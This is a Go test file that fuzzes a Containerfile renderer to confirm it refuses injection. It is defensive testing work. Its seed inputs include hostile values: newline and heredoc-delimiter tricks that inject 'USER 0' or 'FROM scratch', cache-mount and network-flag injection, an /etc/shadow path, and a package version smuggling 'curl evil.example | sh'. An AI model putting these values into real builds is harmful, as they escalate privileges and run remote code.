package render

import (
	"bytes"
	"fmt"
	"strings"
	"testing"

	"github.com/moby/buildkit/frontend/dockerfile/parser"
	"github.com/moby/buildkit/frontend/dockerfile/shell"

	"github.com/northcutted/clearcutt-factory/internal/lock"
	"github.com/northcutted/clearcutt-factory/internal/manifest"
)

// fuzzInput is every value FuzzRender varies: those the Containerfile holds
// unquoted, quoted, or in a heredoc.
type fuzzInput struct {
	user, workdir, envKey, envValue, labelKey, labelValue string
	ociPath, ociDest, buildRun, step, cache, pkgVersion   string
}

// render renders the image fixture and the app fixture with in's values.
func (in fuzzInput) render(t *testing.T) (image, app *Output, imageErr, appErr error) {
	m, l := fixture(t)
	m.Spec.User, m.Spec.Workdir = in.user, in.workdir
	m.Spec.Env = map[string]string{in.envKey: in.envValue}
	m.Spec.Labels = map[string]string{in.labelKey: in.labelValue}
	for i, tool := range m.Spec.Tools {
		switch tool.From {
		case manifest.FromOCI:
			tool.Path, tool.Dest = in.ociPath, in.ociDest
		case manifest.FromBuild:
			tool.Run = in.buildRun
		}
		m.Spec.Tools[i] = tool
		l.Tools[i].SpecDigest = lock.Digest(tool)
	}
	for _, pkgs := range l.Packages.Platforms {
		pkgs[0].Version = in.pkgVersion
	}
	image, imageErr = Render(m, l)

	am, al := appFixture(t)
	am.Spec.User, am.Spec.Workdir = in.user, in.workdir
	am.Spec.BuildEnv = map[string]string{in.envKey: in.envValue}
	am.Stack.Spec.Steps[0].Run = in.step
	am.Stack.Spec.Caches = []string{in.cache}
	al.App.StackDigest = lock.StackDigest(am.Stack)
	app, appErr = Render(am, al)
	return image, app, imageErr, appErr
}

// benign is in with every value replaced by a plain one, keeping which are
// empty: it renders the instructions in's render must have.
func (in fuzzInput) benign() fuzzInput {
	or := func(v, plain string) string {
		if v == "" {
			return ""
		}
		return plain
	}
	return fuzzInput{
		user: or(in.user, "65532"), workdir: or(in.workdir, "/work"),
		envKey: "KEY", envValue: or(in.envValue, "value"), labelKey: or(in.labelKey, "label"), labelValue: or(in.labelValue, "value"),
		ociPath: "/ko-app/crane", ociDest: or(in.ociDest, "/usr/local/bin/crane"),
		buildRun: "pip install awscli", step: "go mod download", cache: "/go/pkg/mod", pkgVersion: "1.8.2-r2",
	}
}

// instruction is one parsed instruction, as much as decides what it does.
type instruction struct {
	name     string
	flags    []string
	args     []string
	heredocs []string
}

func parse(t *testing.T, containerfile []byte) []instruction {
	t.Helper()
	res, err := parser.Parse(bytes.NewReader(containerfile))
	if err != nil {
		t.Fatalf("BuildKit can't parse the rendered Containerfile: %v\n%s", err, containerfile)
	}
	var out []instruction
	for _, n := range res.AST.Children {
		in := instruction{name: strings.ToLower(n.Value), flags: n.Flags}
		for a := n.Next; a != nil; a = a.Next {
			in.args = append(in.args, a.Value)
		}
		for _, h := range n.Heredocs {
			in.heredocs = append(in.heredocs, h.Content)
		}
		out = append(out, in)
	}
	return out
}

// lastStage returns the instructions after the last FROM.
func lastStage(ins []instruction) []instruction {
	for i := len(ins) - 1; i >= 0; i-- {
		if ins[i].name == "from" {
			return ins[i+1:]
		}
	}
	return nil
}

func named(ins []instruction, name string) []instruction {
	var out []instruction
	for _, in := range ins {
		if in.name == name {
			out = append(out, in)
		}
	}
	return out
}

// unquote reads a word as BuildKit does (ENV and LABEL values).
func unquote(t *testing.T, word string) string {
	t.Helper()
	v, _, err := shell.NewLex('\\').ProcessWord(word, shell.EnvsFromSlice(nil))
	if err != nil {
		t.Fatalf("BuildKit can't read %q: %v", word, err)
	}
	return v
}

// sameShape checks that got has the instructions want has, in order, with
// the same flags, arguments, and heredocs, except where in's values go.
func sameShape(t *testing.T, what string, got, want []instruction, containerfile []byte) {
	t.Helper()
	fail := func(format string, a ...any) {
		t.Helper()
		t.Fatalf("%s: %s\n%s", what, fmt.Sprintf(format, a...), containerfile)
	}
	if len(got) != len(want) {
		fail("%d instructions, want %d", len(got), len(want))
	}
	for i := range want {
		g, w := got[i], want[i]
		if g.name != w.name || len(g.flags) != len(w.flags) || len(g.args) != len(w.args) || len(g.heredocs) != len(w.heredocs) {
			fail("instruction %d is %s with %d flags, %d arguments, %d heredocs; want %s with %d, %d, %d",
				i, g.name, len(g.flags), len(g.args), len(g.heredocs), w.name, len(w.flags), len(w.args), len(w.heredocs))
		}
	}
}

func checkRendered(t *testing.T, in fuzzInput, image, app *Output) {
	b := in.benign()
	wantImage, wantApp, ierr, aerr := b.render(t)
	if ierr != nil || aerr != nil {
		t.Fatalf("the plain input fails: %v, %v", ierr, aerr)
	}

	got := parse(t, image.Containerfile)
	sameShape(t, "image", got, parse(t, wantImage.Containerfile), image.Containerfile)
	final := lastStage(got)
	fail := func(format string, a ...any) {
		t.Helper()
		t.Fatalf("image: %s\n%s", fmt.Sprintf(format, a...), image.Containerfile)
	}
	if u := named(final, "user"); in.user != "" && (len(u) != 1 || u[0].args[0] != in.user) {
		fail("USER is %v, want %q", u, in.user)
	}
	if w := named(final, "workdir"); in.workdir != "" && (len(w) != 1 || w[0].args[0] != in.workdir) {
		fail("WORKDIR is %v, want %q", w, in.workdir)
	}
	if e := named(final, "env"); len(e) != 1 || e[0].args[0] != in.envKey || unquote(t, e[0].args[1]) != in.envValue {
		fail("ENV is %v, want %q=%q", e, in.envKey, in.envValue)
	}
	if lb := named(final, "label"); len(lb) != 1 || unquote(t, lb[0].args[0]) != in.labelKey || unquote(t, lb[0].args[1]) != in.labelValue {
		fail("LABEL is %v, want %q=%q", lb, in.labelKey, in.labelValue)
	}
	var oci, build, apk bool
	for _, x := range got {
		switch {
		case x.name == "copy" && len(x.args) == 2 && x.args[0] == in.ociPath:
			dest := in.ociDest
			if dest == "" {
				dest = "/usr/local/bin/crane"
			}
			oci = x.args[1] == dest
		case x.name == "run" && len(x.heredocs) == 1 && strings.HasPrefix(x.heredocs[0], "set -eu\nmkdir -p /out\n"):
			build = x.heredocs[0] == "set -eu\nmkdir -p /out\n"+strings.TrimRight(in.buildRun, "\n")+"\n"
		case x.name == "run" && strings.HasPrefix(strings.Join(x.args, " "), "apk add "):
			apk = apk || hasWord(strings.Fields(strings.Join(x.args, " ")), "jq="+in.pkgVersion)
		}
	}
	if !oci || !build || !apk {
		fail("oci copy %v, build script %v, apk pin %v: want each as given", oci, build, apk)
	}

	got = parse(t, app.Containerfile)
	sameShape(t, "app", got, parse(t, wantApp.Containerfile), app.Containerfile)
	steps := named(got, "run")
	if len(steps) != 2 || steps[0].heredocs[0] != "set -eu\nmkdir -p /out\n"+strings.TrimRight(in.step, "\n")+"\n" {
		t.Fatalf("app: the first step is %v, want %q\n%s", steps, in.step, app.Containerfile)
	}
	if len(steps[0].flags) != 1 || steps[0].flags[0] != "--mount=type=cache,target="+in.cache+",id="+in.cache+",sharing=locked" {
		t.Fatalf("app: the step's mounts are %q, want the cache %q\n%s", steps[0].flags, in.cache, app.Containerfile)
	}
	if u := named(lastStage(got), "user"); in.user != "" && (len(u) != 1 || u[0].args[0] != in.user) {
		t.Fatalf("app: USER is %v, want %q\n%s", u, in.user, app.Containerfile)
	}
}

func hasWord(words []string, w string) bool {
	for _, x := range words {
		if x == w {
			return true
		}
	}
	return false
}

// FuzzRender renders an image and an app with arbitrary values in every
// field the Containerfile holds and parses the result with BuildKit's own
// parser: either Render refuses the input, or the Containerfile has
// exactly the instructions a plain input gives, with each value where it
// belongs, unchanged.
func FuzzRender(f *testing.F) {
	for _, in := range adversarial {
		f.Add(in.user, in.workdir, in.envKey, in.envValue, in.labelKey, in.labelValue, in.ociPath, in.ociDest, in.buildRun, in.step, in.cache, in.pkgVersion)
	}
	f.Fuzz(func(t *testing.T, user, workdir, envKey, envValue, labelKey, labelValue, ociPath, ociDest, buildRun, step, cache, pkgVersion string) {
		in := fuzzInput{user, workdir, envKey, envValue, labelKey, labelValue, ociPath, ociDest, buildRun, step, cache, pkgVersion}
		image, app, ierr, aerr := in.render(t)
		if ierr != nil || aerr != nil {
			return // refused
		}
		checkRendered(t, in, image, app)
	})
}

// adversarial seeds FuzzRender, and TestRenderRefusesInjection checks
// each is refused or rendered as given.
var adversarial = []fuzzInput{
	plain,
	with(func(in *fuzzInput) { in.user = "65532\nUSER 0" }),
	with(func(in *fuzzInput) { in.user = "65532 \\\n0" }),
	with(func(in *fuzzInput) { in.user = "" }),
	with(func(in *fuzzInput) { in.workdir = "/app\nUSER 0" }),
	with(func(in *fuzzInput) { in.workdir = "/my app" }),
	with(func(in *fuzzInput) { in.workdir = "/$HOME" }),
	with(func(in *fuzzInput) { in.envKey = "A=1\nUSER 0\nENV B" }),
	with(func(in *fuzzInput) { in.envKey = "A B" }),
	with(func(in *fuzzInput) { in.envValue = "x\nUSER 0" }),
	with(func(in *fuzzInput) { in.envValue = `say "$HI" \ ` + "`id`" }),
	with(func(in *fuzzInput) { in.envValue = "trailing \\" }),
	with(func(in *fuzzInput) { in.labelKey = "a\"\nUSER 0\nLABEL \"b" }),
	with(func(in *fuzzInput) { in.labelValue = "x\r\nUSER 0" }),
	with(func(in *fuzzInput) { in.ociPath = "/ko-app/crane /etc/shadow" }),
	with(func(in *fuzzInput) { in.ociPath = "/ko-app/crane\nUSER 0" }),
	with(func(in *fuzzInput) { in.ociDest = "/usr/bin/x\nUSER 0" }),
	with(func(in *fuzzInput) { in.buildRun = "echo hi\nFACTORY_EOF\nUSER 0\nRUN <<'FACTORY_EOF'\ntrue" }),
	with(func(in *fuzzInput) { in.buildRun = "FACTORY_EOF_" }),
	with(func(in *fuzzInput) {
		in.step = "go build\nFACTORY_EOF\nFROM scratch\nCOPY / /\nRUN <<'FACTORY_EOF'\ntrue"
	}),
	with(func(in *fuzzInput) { in.step = "go build\r\nFACTORY_EOF\r\nUSER 0" }),
	with(func(in *fuzzInput) { in.cache = "/go/pkg/mod,type=bind,source=/,target=/x" }),
	with(func(in *fuzzInput) { in.cache = "/go/pkg/mod --network=host" }),
	with(func(in *fuzzInput) { in.pkgVersion = "1.0 \\\n && curl evil.example | sh" }),
	with(func(in *fuzzInput) { in.pkgVersion = "1.0\nUSER 0" }),
}

var plain = fuzzInput{
	user: "65532", workdir: "/work", envKey: "KEY", envValue: "value", labelKey: "label", labelValue: "value",
	ociPath: "/ko-app/crane", ociDest: "/usr/local/bin/crane", buildRun: "pip install awscli", step: "go mod download",
	cache: "/go/pkg/mod", pkgVersion: "1.8.2-r2",
}

func with(change func(*fuzzInput)) fuzzInput {
	in := plain
	change(&in)
	return in
}

// TestRenderRefusesInjection: a value that would end its instruction and
// start another (USER 0 after a user, a step that ends its heredoc) is
// refused, or rendered so BuildKit reads it as given.
func TestRenderRefusesInjection(t *testing.T) {
	for _, in := range adversarial {
		image, app, ierr, aerr := in.render(t)
		if ierr != nil || aerr != nil {
			continue
		}
		checkRendered(t, in, image, app)
	}

	// The cited case, end to end: refused with the field named.
	m, l := fixture(t)
	m.Spec.User = "65532\nUSER 0"
	if _, err := Render(m, l); err == nil || !strings.Contains(err.Error(), "spec.user") {
		t.Errorf("user with a second USER: %v", err)
	}
	// A script holding the delimiter gets another one.
	in := with(func(in *fuzzInput) { in.step = "echo FACTORY_EOF\nFACTORY_EOF\nUSER 0" })
	_, app, _, err := in.render(t)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(app.Containerfile), "<<'FACTORY_EOF_") || strings.Count(string(app.Containerfile), "<<'FACTORY_EOF'\n") != 1 {
		t.Errorf("the delimiter was not changed:\n%s", app.Containerfile)
	}
	// A lock edited by hand is refused too.
	m, l = fixture(t)
	l.Packages.Platforms["linux/amd64"][0].Version = "1.8.2-r2 \\\n && curl evil.example | sh"
	if _, err := Render(m, l); err == nil || !strings.Contains(err.Error(), "lock packages linux/amd64 (jq)") {
		t.Errorf("edited lock: %v", err)
	}
}
